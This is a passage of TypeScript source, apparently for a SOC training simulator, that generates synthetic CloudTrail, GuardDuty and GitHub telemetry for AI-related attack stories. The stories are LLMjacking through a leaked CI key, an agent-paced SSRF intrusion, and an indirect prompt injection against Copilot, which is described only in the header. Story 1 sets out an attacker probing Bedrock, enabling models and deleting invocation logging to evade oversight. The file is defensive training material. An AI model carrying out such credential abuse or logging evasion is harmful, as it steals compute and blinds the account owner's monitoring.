/**
 * AI-related attack stories for the live feed, ADVANCED tier, batch A.
 *
 *   1. ai-bedrock-key-abuse           LLMjacking: a leaked long-term CI access key drives the
 *                                     documented Bedrock CloudTrail sequence, then GuardDuty.
 *   2. ai-agentic-intrusion-tempo     Agent-paced intrusion (MITRE campaign C0062 pattern):
 *                                     web recon, SSRF to instance credentials, secrets, a decoy
 *                                     key that trips, S3 read, all at machine tempo.
 *   3. ai-copilot-indirect-injection  Zero-click indirect prompt injection against a Microsoft 365
 *                                     Copilot user (EchoLeak-class), visible in mail flow, Purview
 *                                     CopilotInteraction and the web proxy.
 *
 * These are defensive training telemetry: each record is what a real product writes. No source in
 * these stories logs prompt or response text (CloudTrail, GuardDuty, Purview CopilotInteraction
 * and the proxy do not), so the analyst reasons from who, what resource, which credential and how
 * fast. Counts and rates are never written into raw fields; they are in the descriptions.
 *
 * Authored for one company each and adapted per company by instantiateStory (victim identity,
 * hostnames, private subnet, mail domain). Stories 1-2 are cloud-only and use the neutral
 * AWS account 247316892041 and company-neutral resource names; story 3 is authored on NexaCorp.
 *
 * Fields follow research/ai-attacks-soc appendix 02: CloudTrail camelCase under aws.cloudtrail.*
 * (as the platform's CloudTrail emitter renders), GuardDuty under aws.guardduty.*, the native AWS
 * WAF log schema (httpRequest.*), Purview CopilotInteraction flattened under data.office365.*
 * (arrays are parallel, in resource order), Defender for Office 365 mail records, and Zscaler NSS.
 */

import type { TelemetryEvent } from "@/lib/sim/types";

export interface AiStoryDef {
  id: string;
  title: string;
  complexity: "foundation" | "core" | "advanced";
  companies: string[];
  events: TelemetryEvent[];
}

// ═══════════════════════════════════════════════════════════════════════════════
// Shared builders
// ═══════════════════════════════════════════════════════════════════════════════

const AWS_ACCOUNT = "247316892041";
const ep = (ts: string): number => Date.parse(ts);

const UA_CHROME_MAC =
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36";
const UA_EDGE_WIN =
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0";

/** The identity block CloudTrail writes for one caller. */
interface Ident {
  type: "IAMUser" | "AssumedRole";
  arn: string;
  principalId: string;
  accessKeyId: string;
  userName?: string;          // IAMUser only
  issuerName?: string;        // AssumedRole: the role name
  issuerArn?: string;
  mfa?: boolean;              // sessionContext.attributes.mfaAuthenticated
  sessionCreated?: string;    // sessionContext.attributes.creationDate
  ec2RoleDelivery?: string;   // "1.0" = IMDSv1, "2.0" = IMDSv2
}

interface CtOpts {
  id: string;
  ts: string;
  name: string;               // eventName
  source: string;             // eventSource
  region: string;
  ip: string;
  ua: string;
  ident: Ident;
  readOnly: boolean;
  management?: boolean;       // default true (false for S3 data events)
  fail?: { code: string; message: string };
  params?: Record<string, string>;
  host?: string;              // tlsDetails.clientProvidedHostHeader
  vpce?: string;              // vpcEndpointId
  requestId: string;
  extra?: Record<string, unknown>;
  eventType: TelemetryEvent["event_type"];
  severity: TelemetryEvent["severity"];
  description: string;
  user_email?: string;
  user_title?: string;
  mitre?: string;
  tactic?: string;
  geo?: TelemetryEvent["geo"];
  baseline?: boolean;         // benign context: how the same identity normally behaves
}

/** One CloudTrail record (one record per API call), platform camelCase schema. */
function ct(o: CtOpts): TelemetryEvent {
  const i = o.ident;
  const failed = o.fail !== undefined;
  const requestParams: Record<string, string> = {};
  for (const [k, v] of Object.entries(o.params ?? {})) requestParams[`aws.cloudtrail.requestParameters.${k}`] = v;
  const raw: Record<string, unknown> = {
    "aws.cloudtrail.eventName": o.name,
    "aws.cloudtrail.eventSource": o.source,
    "aws.cloudtrail.awsRegion": o.region,
    "aws.cloudtrail.userIdentity.type": i.type,
    "aws.cloudtrail.userIdentity.principalId": i.principalId,
    "aws.cloudtrail.userIdentity.arn": i.arn,
    "aws.cloudtrail.userIdentity.accountId": AWS_ACCOUNT,
    "aws.cloudtrail.userIdentity.accessKeyId": i.accessKeyId,
    ...(i.userName ? { "aws.cloudtrail.userIdentity.userName": i.userName } : {}),
    ...(i.issuerName ? {
      "aws.cloudtrail.userIdentity.sessionContext.sessionIssuer.type": "Role",
      "aws.cloudtrail.userIdentity.sessionContext.sessionIssuer.userName": i.issuerName,
    } : {}),
    ...(i.issuerArn ? { "aws.cloudtrail.userIdentity.sessionContext.sessionIssuer.arn": i.issuerArn } : {}),
    ...(i.mfa !== undefined ? { "aws.cloudtrail.userIdentity.sessionContext.attributes.mfaAuthenticated": String(i.mfa) } : {}),
    ...(i.sessionCreated ? { "aws.cloudtrail.userIdentity.sessionContext.attributes.creationDate": i.sessionCreated } : {}),
    ...(i.ec2RoleDelivery ? { "aws.cloudtrail.userIdentity.sessionContext.ec2RoleDelivery": i.ec2RoleDelivery } : {}),
    "aws.cloudtrail.sourceIPAddress": o.ip,
    "aws.cloudtrail.userAgent": o.ua,
    ...requestParams,
    ...(o.fail ? { "aws.cloudtrail.errorCode": o.fail.code, "aws.cloudtrail.errorMessage": o.fail.message } : {}),
    "aws.cloudtrail.requestID": o.requestId,
    ...(o.host ? { "aws.cloudtrail.tlsDetails.clientProvidedHostHeader": o.host } : {}),
    ...(o.vpce ? { "aws.cloudtrail.vpcEndpointId": o.vpce } : {}),
    "aws.cloudtrail.eventType": "AwsApiCall",
    "aws.cloudtrail.readOnly": String(o.readOnly),
    "aws.cloudtrail.managementEvent": String(o.management ?? true),
    "cloud.provider": "aws",
    "cloud.account.id": AWS_ACCOUNT,
    "cloud.region": o.region,
    "event.outcome": failed ? "failure" : "success",
    "source.ip": o.ip,
    ...(o.extra ?? {}),
    "action_result": failed ? (o.fail!.code === "AccessDenied" ? "denied" : "failed") : "allowed",
  };
  return {
    id: o.id, ts: o.ts, source: "cloudtrail", vendor: "AWS CloudTrail", event_type: o.eventType, severity: o.severity,
    src_ip: o.ip,
    ...(o.user_email ? { user_email: o.user_email } : {}),
    ...(o.user_title ? { user_title: o.user_title } : {}),
    ...(o.geo ? { geo: o.geo } : {}),
    ...(o.mitre ? { mitre_technique: o.mitre } : {}),
    ...(o.tactic ? { mitre_tactic: o.tactic } : {}),
    ...(o.baseline ? { is_baseline: true, expected_verdict: "informational" as const } : {}),
    description: o.description,
    raw,
  };
}

interface GdOpts {
  id: string;
  ts: string;
  type: string;
  score: number;
  title?: string;
  api: string;
  service: string;
  ip: string;
  country: string;
  asn: string;
  region: string;
  ident: Ident;
  instanceId?: string;
  extra?: Record<string, unknown>;
  severity: TelemetryEvent["severity"];
  description: string;
  mitre?: string;
  tactic?: string;
  geo: TelemetryEvent["geo"];
  /** When the API call behind the finding happened (service.eventFirstSeen / eventLastSeen). */
  seen: string;
  /** The finding's own description text (aws.guardduty.description). */
  detail: string;
}

/** The account's GuardDuty detector (one per account and region set, a 32-hex id). */
const GD_DETECTOR = "c6bd3e91f2a84d57b09e1a3c5d7f8e24";

/** Autonomous system number and ISP GuardDuty reports for the hosting networks used below. */
const GD_NET: Record<string, { asn: string; isp: string }> = {
  "SCALEWAY S.A.S.": { asn: "12876", isp: "Scaleway" },
  "DigitalOcean, LLC": { asn: "14061", isp: "DigitalOcean" },
};

/** One GuardDuty finding (vendor AWS GuardDuty) as the platform's emitter renders it. */
function gd(o: GdOpts): TelemetryEvent {
  const i = o.ident;
  const findingId = hex(`gd:${o.id}`, 32);
  const net = GD_NET[o.asn];
  const api = "aws.guardduty.service.action.awsApiCallAction.remoteIpDetails";
  const raw: Record<string, unknown> = {
    "aws.guardduty.schemaVersion": "2.0",
    "aws.guardduty.id": findingId,
    "aws.guardduty.arn": `arn:aws:guardduty:${o.region}:${AWS_ACCOUNT}:detector/${GD_DETECTOR}/finding/${findingId}`,
    "aws.guardduty.accountId": AWS_ACCOUNT,
    "aws.guardduty.region": o.region,
    "aws.guardduty.partition": "aws",
    "aws.guardduty.createdAt": o.ts,
    "aws.guardduty.updatedAt": o.ts,
    "aws.guardduty.description": o.detail,
    "aws.guardduty.service.serviceName": "guardduty",
    "aws.guardduty.service.detectorId": GD_DETECTOR,
    "aws.guardduty.service.archived": "false",
    "aws.guardduty.service.eventFirstSeen": o.seen,
    "aws.guardduty.service.eventLastSeen": o.seen,
    "aws.guardduty.type": o.type,
    "aws.guardduty.severity": String(o.score),
    ...(o.title ? { "aws.guardduty.title": o.title } : {}),
    "aws.guardduty.service.action.actionType": "AWS_API_CALL",
    "aws.guardduty.service.action.awsApiCallAction.api": o.api,
    "aws.guardduty.service.action.awsApiCallAction.serviceName": o.service,
    "aws.guardduty.service.action.awsApiCallAction.callerType": "Remote IP",
    "aws.guardduty.service.action.awsApiCallAction.remoteIpDetails.ipAddressV4": o.ip,
    "aws.guardduty.service.action.awsApiCallAction.remoteIpDetails.country.countryName": o.country,
    "aws.guardduty.service.action.awsApiCallAction.remoteIpDetails.organization.asnOrg": o.asn,
    ...(o.geo?.city ? { [`${api}.city.cityName`]: o.geo.city } : {}),
    ...(o.geo?.latitude !== undefined ? { [`${api}.geoLocation.lat`]: o.geo.latitude } : {}),
    ...(o.geo?.longitude !== undefined ? { [`${api}.geoLocation.lon`]: o.geo.longitude } : {}),
    ...(net ? { [`${api}.organization.asn`]: net.asn } : {}),
    "aws.guardduty.resource.resourceType": "AccessKey",
    "aws.guardduty.resource.accessKeyDetails.accessKeyId": i.accessKeyId,
    "aws.guardduty.resource.accessKeyDetails.principalId": i.principalId,
    "aws.guardduty.resource.accessKeyDetails.userType": i.type,
    ...((i.userName ?? i.issuerName) ? { "aws.guardduty.resource.accessKeyDetails.userName": i.userName ?? i.issuerName } : {}),
    ...(o.instanceId ? { "aws.guardduty.resource.instanceDetails.instanceId": o.instanceId } : {}),
    "aws.guardduty.service.count": "1",
    "cloud.account.id": AWS_ACCOUNT,
    "cloud.region": o.region,
    "source.ip": o.ip,
    ...((i.userName ?? i.issuerName) ? { "user.name": i.userName ?? i.issuerName } : {}),
    "event.module": "aws",
    "event.created": new Date(Date.parse(o.ts) + 1_460).toISOString(),
    ...(o.extra ?? {}),
    "action_result": "detected",
  };
  return {
    id: o.id, ts: o.ts, source: "cloudtrail", vendor: "AWS GuardDuty", event_type: "cloud_api_call", severity: o.severity,
    src_ip: o.ip, geo: o.geo, is_detection: true,
    ...(o.mitre ? { mitre_technique: o.mitre } : {}),
    ...(o.tactic ? { mitre_tactic: o.tactic } : {}),
    description: o.description,
    raw,
  };
}

// ═══════════════════════════════════════════════════════════════════════════════
// STORY 1: ai-bedrock-key-abuse
// LLMjacking (Sysdig 2024, Permiso, Entro, Wiz JINX-2401; ATLAS case study AML.CS0030).
// ═══════════════════════════════════════════════════════════════════════════════

const BK_IP = "62.210.71.148";                       // hosting provider, Paris (resolves to France)
const BK_GEO = { country: "France", city: "Paris", latitude: 48.8566, longitude: 2.3522 };
const BK_KEY = "AKIAXH3KQ7NZ6R2JYFCB";
const BK_RUNNER_IP = "172.16.10.50";                 // the CI runner, remapped to each company's subnet
const BK_VPCE = "vpce-0c4e7a91d2b6358fa";
const BK_UA_RUNNER =
  "Boto3/1.34.131 md/Botocore#1.34.131 ua/2.0 os/linux#5.15.0-1063-aws md/arch#x86_64 lang/python#3.11.9 md/pyimpl#CPython cfg/retry-mode#legacy Botocore/1.34.131";
const BK_UA_A = "Python/3.11 aiohttp/3.9.5";
const BK_UA_B = "Python/3.12 aiohttp/3.9.1";
const BK_SSO_ROLE = "AWSReservedSSO_PlatformAdmin_5d2e8b1c9a047f36";
const BK_RESP_ROLE = "AWSReservedSSO_SecurityResponder_9a4f0c27b6d81e53";
const BK_ADMIN_EGRESS = "84.110.42.17";

const bkCi: Ident = {
  type: "IAMUser",
  userName: "svc-ci-artifacts",
  arn: `arn:aws:iam::${AWS_ACCOUNT}:user/svc-ci-artifacts`,
  principalId: "AIDAXH3KQ7NZ3T6VYGSPD",
  accessKeyId: BK_KEY,
};
const bkAdmin: Ident = {
  type: "AssumedRole",
  arn: `arn:aws:sts::${AWS_ACCOUNT}:assumed-role/${BK_SSO_ROLE}/n.shapiro@rocketstack.io`,
  principalId: "AROAXH3KQ7NZM4C8RTBVE:n.shapiro@rocketstack.io",
  accessKeyId: "ASIAXH3KQ7NZJ9T5PLDE",
  issuerName: BK_SSO_ROLE,
  issuerArn: `arn:aws:iam::${AWS_ACCOUNT}:role/aws-reserved/sso.amazonaws.com/${BK_SSO_ROLE}`,
  mfa: true,
  sessionCreated: "2026-09-08T09:58:31Z",
};
const bkResponder: Ident = {
  type: "AssumedRole",
  arn: `arn:aws:sts::${AWS_ACCOUNT}:assumed-role/${BK_RESP_ROLE}/secops-oncall`,
  principalId: "AROAXH3KQ7NZG5D1VXWLA:secops-oncall",
  accessKeyId: "ASIAXH3KQ7NZR8W2NKQF",
  issuerName: BK_RESP_ROLE,
  issuerArn: `arn:aws:iam::${AWS_ACCOUNT}:role/aws-reserved/sso.amazonaws.com/${BK_RESP_ROLE}`,
  mfa: true,
  sessionCreated: "2026-09-22T08:47:52Z",
};

const bkAtk = (
  o: Pick<CtOpts, "id" | "ts" | "name" | "region" | "requestId" | "severity" | "description" | "eventType"> &
    Partial<CtOpts>,
): TelemetryEvent =>
  ct({
    source: "bedrock.amazonaws.com", ip: BK_IP, ua: BK_UA_A, ident: bkCi, readOnly: false, geo: BK_GEO,
    user_title: "Service Account", ...o,
  });

const AI_BEDROCK_KEY_ABUSE: TelemetryEvent[] = [
  // 1. BASELINE, 8 Sep. How the CI user came to hold Bedrock administration rights (privilege chain).
  ct({
    id: "aibk1", ts: "2026-09-08T10:14:09.000Z", name: "PutUserPolicy", source: "iam.amazonaws.com", region: "us-east-1",
    ip: BK_ADMIN_EGRESS, ua: UA_CHROME_MAC, ident: bkAdmin, readOnly: false, eventType: "cloud_role_change", severity: "informational",
    user_email: "n.shapiro@rocketstack.io", baseline: true,
    params: {
      userName: "svc-ci-artifacts",
      policyName: "release-notes-bedrock",
      policyDocument: JSON.stringify({
        Version: "2012-10-17",
        Statement: [{ Effect: "Allow", Action: ["bedrock:*", "aws-marketplace:ViewSubscriptions", "aws-marketplace:Subscribe"], Resource: "*" }],
      }),
    },
    requestId: "5b7e2c94-1d03-4a68-b9f1-83e0a6d4c752",
    description:
      "PutUserPolicy (iam.amazonaws.com) on 8 Sep: an MFA-authenticated AWSReservedSSO_PlatformAdmin session for n.shapiro@rocketstack.io attached the inline policy release-notes-bedrock to IAM user svc-ci-artifacts, allowing bedrock:* and the aws-marketplace Subscribe and ViewSubscriptions actions on all resources, for the release pipeline's release-notes summarisation stage. This is how the CI user came to hold Bedrock administration rights, not just InvokeModel.",
  }),

  // 2. BASELINE. The key's normal behaviour: the CI runner, one region, one model, via a VPC endpoint.
  ct({
    id: "aibk2", ts: "2026-09-22T07:22:41.318Z", name: "InvokeModel", source: "bedrock.amazonaws.com", region: "us-east-1",
    ip: BK_RUNNER_IP, ua: BK_UA_RUNNER, ident: bkCi, readOnly: false, eventType: "cloud_api_call", severity: "informational",
    user_title: "Service Account", baseline: true, vpce: BK_VPCE,
    params: { modelId: "anthropic.claude-3-5-haiku-20241022-v1:0" },
    host: "bedrock-runtime.us-east-1.amazonaws.com",
    requestId: "c48a1f07-6e29-4b35-9d8c-2a5f7e103b96",
    description:
      "InvokeModel on anthropic.claude-3-5-haiku-20241022-v1:0 in us-east-1 by svc-ci-artifacts (access key AKIAXH3KQ7NZ6R2JYFCB) from the CI runner 172.16.10.50 through VPC endpoint vpce-0c4e7a91d2b6358fa, with a Boto3 user agent reporting Linux. This is the key's normal pattern: one region, one model, a private address, a VPC endpoint.",
  }),

  // 3. PROVENANCE. GitHub secret scanning: the key is in a public repository (T1552.001, ATLAS AML.T0055).
  {
    id: "aibk3", ts: "2026-09-22T07:41:58.774Z", source: "vcs", vendor: "GitHub Advanced Security", event_type: "dlp_alert",
    severity: "high", mitre_technique: "T1552.001", mitre_tactic: "Credential Access",
    description:
      "GitHub Advanced Security opened secret-scanning alert #4 on the public repository platform-eng/release-tooling: an Amazon AWS Access Key ID in scripts/publish_artifacts.sh line 14 at commit e5c91d20, flagged key AKIAXH3KQ7NZ6R2JYFCB, the access key of IAM user svc-ci-artifacts. The alert reports publicly_leaked true and has no assignee (ATLAS AML.T0055 Unsecured Credentials).",
    raw: {
      "event.provider": "GitHub Advanced Security",
      "event.action": "created",
      "event.type": "creation",
      "event.module": "github",
      "event.created": "2026-09-22T07:41:59.204Z",
      "alert.id": "4",
      "alert.name": "Amazon AWS Access Key ID",
      "alert.status": "open",
      "file.path": "scripts/publish_artifacts.sh",
      "github.org": "platform-eng",
      "github.repo": "platform-eng/release-tooling",
      "github.visibility": "public",
      "github.secret_scanning_alert.number": "4",
      "github.secret_scanning_alert.state": "open",
      "github.secret_scanning_alert.secret_type": "aws_access_key_id",
      "github.secret_scanning_alert.secret_type_display_name": "Amazon AWS Access Key ID",
      "github.secret_scanning_alert.created_at": "2026-09-22T07:41:58Z",
      "github.secret_scanning_alert.html_url": "https://github.com/platform-eng/release-tooling/security/secret-scanning/4",
      "github.secret_scanning_alert.publicly_leaked": "true",
      "github.secret_scanning_alert.multi_repo": "false",
      "github.secret_scanning_alert.first_location_detected.path": "scripts/publish_artifacts.sh",
      "github.secret_scanning_alert.first_location_detected.start_line": "14",
      "github.secret_scanning_alert.first_location_detected.commit_sha": "e5c91d20b7a4386f1d0c2e9a7b5f4d3861c0a2ef",
      "github.secret_scanning_alert.first_location_detected.type": "commit",
      "github.secret_scanning_alert.first_location_detected.end_line": "14",
      "github.secret_scanning_alert.first_location_detected.start_column": "26",
      "github.secret_scanning_alert.first_location_detected.end_column": "45",
      "github.secret_scanning_alert.first_location_detected.blob_sha": hex("blob:aibk3", 40),
      "github.secret_scanning_alert.first_location_detected.blob_url": `https://api.github.com/repos/platform-eng/release-tooling/git/blobs/${hex("blob:aibk3", 40)}`,
      "github.secret_scanning_alert.first_location_detected.commit_url": "https://api.github.com/repos/platform-eng/release-tooling/git/commits/e5c91d20b7a4386f1d0c2e9a7b5f4d3861c0a2ef",
      "github.secret_scanning_alert.updated_at": "2026-09-22T07:41:58Z",
      "github.secret_scanning_alert.url": "https://api.github.com/repos/platform-eng/release-tooling/secret-scanning/alerts/4",
      "github.secret_scanning_alert.locations_url": "https://api.github.com/repos/platform-eng/release-tooling/secret-scanning/alerts/4/locations",
      "github.secret_scanning_alert.secret": BK_KEY,
      "github.secret_scanning_alert.validity": "active",
      "github.secret_scanning_alert.push_protection_bypassed": "false",
      "github.secret_scanning_alert.has_more_locations": "false",
    },
  },

  // 4. FIRST USE OFF THE RUNNER. Does the account log Bedrock invocations? (T1078.004, ATLAS AML.T0012)
  bkAtk({
    id: "aibk4", ts: "2026-09-22T07:58:23.406Z", name: "GetModelInvocationLoggingConfiguration", region: "us-east-1", readOnly: true,
    host: "bedrock.us-east-1.amazonaws.com", requestId: "9e13b6d2-40a7-4c85-8f1e-7d2a05c9b341",
    eventType: "cloud_api_call", severity: "high", mitre: "T1078.004", tactic: "Initial Access",
    description:
      "GetModelInvocationLoggingConfiguration in us-east-1 by access key AKIAXH3KQ7NZ6R2JYFCB from 62.210.71.148 (Paris, France; a hosting-provider address) with a Python aiohttp user agent, 16 minutes after the secret-scanning alert. First use of the key away from the CI runner: a different address, no VPC endpoint, a scripted agent, and a call the release-notes stage has no reason to make (ATLAS AML.T0012 Valid Accounts).",
  }),

  // 5. THE PROBE. A malformed InvokeModel that answers ValidationException (T1526).
  bkAtk({
    id: "aibk5", ts: "2026-09-22T07:59:07.881Z", name: "InvokeModel", region: "us-east-1",
    params: { modelId: "anthropic.claude-v2" }, host: "bedrock-runtime.us-east-1.amazonaws.com",
    fail: { code: "ValidationException", message: "max_tokens_to_sample: range: 1..1,000,000" },
    requestId: "2f60d8a5-b1c3-4e97-a052-6c8e19d7f4b0",
    eventType: "cloud_api_call", severity: "high", mitre: "T1526", tactic: "Discovery",
    description:
      "InvokeModel on anthropic.claude-v2 in us-east-1 by the same key from 62.210.71.148 returned errorCode ValidationException (max_tokens_to_sample: range: 1..1,000,000), 44 seconds after the logging-configuration read. A request that is rejected for a bad parameter only after authentication and authorisation succeeded proves the key can call Bedrock, and no billable completion is generated.",
  }),

  // 6. MODEL ENABLEMENT. The use-case form the console submits for a human (T1098).
  bkAtk({
    id: "aibk6", ts: "2026-09-22T08:01:12.550Z", name: "PutUseCaseForModelAccess", region: "us-east-1",
    host: "bedrock.us-east-1.amazonaws.com", requestId: "a7d45e10-2c98-4b36-8e0f-91b3c6a2d857",
    eventType: "cloud_api_call", severity: "high", mitre: "T1098", tactic: "Persistence",
    description:
      "PutUseCaseForModelAccess in us-east-1 by access key AKIAXH3KQ7NZ6R2JYFCB from 62.210.71.148: the model-access use-case form the Bedrock console submits on behalf of a human, sent here by an AKIA key with a scripted agent, two minutes after the probe.",
  }),

  // 7. MODEL ENABLEMENT. The entitlement (T1098).
  bkAtk({
    id: "aibk7", ts: "2026-09-22T08:01:49.203Z", name: "PutFoundationModelEntitlement", region: "us-east-1",
    params: { modelId: "anthropic.claude-sonnet-4-20250514-v1:0" }, host: "bedrock.us-east-1.amazonaws.com",
    requestId: "3c8b90e6-d472-41a5-b60f-e5a12d7c8934",
    eventType: "cloud_api_call", severity: "high", mitre: "T1098", tactic: "Persistence",
    description:
      "PutFoundationModelEntitlement for anthropic.claude-sonnet-4-20250514-v1:0 in us-east-1 by the same key from 62.210.71.148, 37 seconds after the use-case submission. Platform engineers enable models with this same API through an SSO session in the console; the credential class, user agent and address around this call are different.",
  }),

  // 8. DEFENSE EVASION. The invocation-logging configuration is deleted (T1562.008).
  bkAtk({
    id: "aibk8", ts: "2026-09-22T08:03:54.037Z", name: "DeleteModelInvocationLoggingConfiguration", region: "us-east-1",
    host: "bedrock.us-east-1.amazonaws.com", requestId: "e1a94c37-8b05-4d62-9f7e-0a6d3b58c412",
    eventType: "policy_modification", severity: "critical", mitre: "T1562.008", tactic: "Defense Evasion",
    description:
      "DeleteModelInvocationLoggingConfiguration in us-east-1 by the same key from 62.210.71.148, two minutes after the entitlement, deleting the configuration the key read at 07:58. From this call on, Bedrock requests in that region leave metadata in CloudTrail but no request or response content.",
  }),

  // 9. THE WAVE. One representative record of a continuous stream, in a second region (T1496.004, ATLAS AML.T0040).
  bkAtk({
    id: "aibk9", ts: "2026-09-22T08:05:44.902Z", name: "InvokeModelWithResponseStream", region: "eu-central-1", ua: BK_UA_B,
    params: { modelId: "eu.anthropic.claude-sonnet-4-20250514-v1:0" }, host: "bedrock-runtime.eu-central-1.amazonaws.com",
    requestId: "70d2f5b8-a361-49c4-8e17-b4c093a6d215",
    eventType: "cloud_api_call", severity: "high", mitre: "T1496.004", tactic: "Impact",
    description:
      "InvokeModelWithResponseStream on eu.anthropic.claude-sonnet-4-20250514-v1:0 in eu-central-1 by the same key from 62.210.71.148, with a different aiohttp version in the user agent, 111 seconds after the logging configuration was deleted. One record from a continuous stream of similar calls (the total belongs in a correlation alert, not in this log). CloudTrail names the caller, model and region but carries no prompt text (ATLAS AML.T0040 AI Model Inference API Access).",
  }),

  // 10. DETECTION. GuardDuty BedrockLoggingDisabled (T1562.008).
  gd({
    id: "aibk10", ts: "2026-09-22T08:09:12.660Z", type: "DefenseEvasion:IAMUser/BedrockLoggingDisabled", score: 5,
    title: "Model invocation logging was disabled in Amazon Bedrock by an IAM identity.",
    api: "DeleteModelInvocationLoggingConfiguration", service: "bedrock.amazonaws.com", ip: BK_IP, country: "France",
    asn: "SCALEWAY S.A.S.", region: "us-east-1", ident: bkCi, geo: BK_GEO, severity: "high", mitre: "T1562.008", tactic: "Defense Evasion",
    seen: "2026-09-22T08:03:54.037Z",
    detail: "An IAM identity called DeleteModelInvocationLoggingConfiguration from a remote IP address, turning off model invocation logging in Amazon Bedrock for this Region.",
    description:
      "GuardDuty raised DefenseEvasion:IAMUser/BedrockLoggingDisabled (severity 5, Medium) in us-east-1: Bedrock model invocation logging was disabled through DeleteModelInvocationLoggingConfiguration by access key AKIAXH3KQ7NZ6R2JYFCB from 62.210.71.148 (SCALEWAY S.A.S.). The finding lands about 5 minutes after the call it describes.",
  }),

  // 11. DETECTION. GuardDuty AI Protection: the key's use is outside its learned baseline (ATLAS AML.T0040).
  gd({
    id: "aibk11", ts: "2026-09-22T08:34:51.318Z", type: "Impact:IAMUser/AnomalousModelInvocation", score: 2,
    api: "InvokeModelWithResponseStream", service: "bedrock.amazonaws.com", ip: BK_IP, country: "France",
    asn: "SCALEWAY S.A.S.", region: "eu-central-1", ident: bkCi, geo: BK_GEO, severity: "medium", mitre: "T1496.004", tactic: "Impact",
    seen: "2026-09-22T08:05:44.902Z",
    detail: "An Amazon Bedrock model was invoked by an IAM identity in a way that differs from the API, model, network and client that GuardDuty has learned for that identity.",
    extra: { "aws.guardduty.resource.modelDetails.0.modelId": "eu.anthropic.claude-sonnet-4-20250514-v1:0" },
    description:
      "GuardDuty raised Impact:IAMUser/AnomalousModelInvocation (severity 2, Low) in eu-central-1 for access key AKIAXH3KQ7NZ6R2JYFCB: the Bedrock API, model, source network and user agent all fall outside what GuardDuty learned for svc-ci-artifacts, which is the runner's Boto3 calls to one Haiku model from a private address (ATLAS AML.T0040).",
  }),

  // 12. CONTAINMENT. The key is deactivated, 54 minutes after first abuse.
  ct({
    id: "aibk12", ts: "2026-09-22T08:52:07.594Z", name: "UpdateAccessKey", source: "iam.amazonaws.com", region: "us-east-1",
    ip: BK_ADMIN_EGRESS, ua: UA_CHROME_MAC, ident: bkResponder, readOnly: false, eventType: "account_modify", severity: "medium",
    params: { userName: "svc-ci-artifacts", accessKeyId: BK_KEY, status: "Inactive" },
    requestId: "b6f3a09d-5e12-4c78-a4d1-38c7e0f92b64",
    description:
      "UpdateAccessKey: an MFA-authenticated AWSReservedSSO_SecurityResponder session set access key AKIAXH3KQ7NZ6R2JYFCB of svc-ci-artifacts to Inactive, 54 minutes after its first use from 62.210.71.148. Deactivation stops the abuse and keeps the key's history; deleting it, re-enabling invocation logging, and adding guardrails on Bedrock regions and entitlements come next.",
  }),
];

// ═══════════════════════════════════════════════════════════════════════════════
// STORY 2: ai-agentic-intrusion-tempo
// Agent-paced intrusion. Pattern of MITRE campaign C0062 (Anthropic GTG-1002): recon, SSRF to the
// metadata service, indiscriminate credential collection, and a decoy that trips.
// ═══════════════════════════════════════════════════════════════════════════════

const AG_IP = "159.89.212.66";                       // DigitalOcean, Bangalore (resolves to India)
const AG_GEO = { country: "India", city: "Bangalore", latitude: 12.9716, longitude: 77.5946 };
const AG_UA_HTTP = "python-httpx/0.27.2";
const AG_UA_BOTO =
  "Boto3/1.35.44 md/Botocore#1.35.44 ua/2.0 os/linux#6.8.0-45-generic md/arch#x86_64 lang/python#3.12.3 md/pyimpl#CPython cfg/retry-mode#legacy Botocore/1.35.44";
const AG_UA_JAVA =
  "aws-sdk-java/2.25.31 Linux/6.1.102-108.177.amzn2023.x86_64 OpenJDK_64-Bit_Server_VM/21.0.4+7-LTS Java/21.0.4 vendor/Amazon.com_Inc. io/sync http/Apache cfg/retry-mode/standard";
const AG_INSTANCE = "i-0b7e41c93a5d28f60";
const AG_INSTANCE_IP = "172.16.10.30";                // the API host, remapped to each company's subnet
const AG_ALB_HOST = "customer-api-alb-1058823391.us-east-1.elb.amazonaws.com";
const AG_WEB_ACL = `arn:aws:wafv2:us-east-1:${AWS_ACCOUNT}:regional/webacl/customer-api-acl/6d0b1f4e-3c92-4a7b-8e15-a2f9c7d04b31`;
const AG_ALB_ID = `${AWS_ACCOUNT}-app/customer-api-alb/9d1b3e6f7a2c4085`;
const AG_RESP_ROLE = "AWSReservedSSO_SecurityResponder_4c7e1a92d0b35f68";
const AG_ADMIN_EGRESS = "84.110.42.17";

const agRole: Ident = {
  type: "AssumedRole",
  arn: `arn:aws:sts::${AWS_ACCOUNT}:assumed-role/customer-api-instance-role/${AG_INSTANCE}`,
  principalId: `AROAXH3KQ7NZP2WD5LVMT:${AG_INSTANCE}`,
  accessKeyId: "ASIAXH3KQ7NZH4B2TRWD",
  issuerName: "customer-api-instance-role",
  issuerArn: `arn:aws:iam::${AWS_ACCOUNT}:role/customer-api-instance-role`,
  sessionCreated: "2026-09-22T22:41:08Z",
  ec2RoleDelivery: "1.0",
};
const agDecoy: Ident = {
  type: "IAMUser",
  userName: "svc-reporting-sync",
  arn: `arn:aws:iam::${AWS_ACCOUNT}:user/svc-reporting-sync`,
  principalId: "AIDAXH3KQ7NZ8V1LFDHRC",
  accessKeyId: "AKIAXH3KQ7NZ5D8MWPRC",
};
const agResponder: Ident = {
  type: "AssumedRole",
  arn: `arn:aws:sts::${AWS_ACCOUNT}:assumed-role/${AG_RESP_ROLE}/secops-oncall`,
  principalId: "AROAXH3KQ7NZW6T9DKQPN:secops-oncall",
  accessKeyId: "ASIAXH3KQ7NZY2M7CBVX",
  issuerName: AG_RESP_ROLE,
  issuerArn: `arn:aws:iam::${AWS_ACCOUNT}:role/aws-reserved/sso.amazonaws.com/${AG_RESP_ROLE}`,
  mfa: true,
  sessionCreated: "2026-09-23T02:58:40Z",
};

/** One AWS WAF log record (native WAF logging schema) for a request that the web ACL allowed. */
function agWaf(o: {
  id: string; ts: string; uri: string; args: string; requestId: string;
  severity: TelemetryEvent["severity"]; description: string; mitre?: string; tactic?: string;
}): TelemetryEvent {
  return {
    id: o.id, ts: o.ts, source: "waf", vendor: "AWS WAF", event_type: "waf_allow", severity: o.severity,
    src_ip: AG_IP, dst_port: 443, protocol: "tcp", geo: AG_GEO,
    ...(o.mitre ? { mitre_technique: o.mitre } : {}),
    ...(o.tactic ? { mitre_tactic: o.tactic } : {}),
    network: {
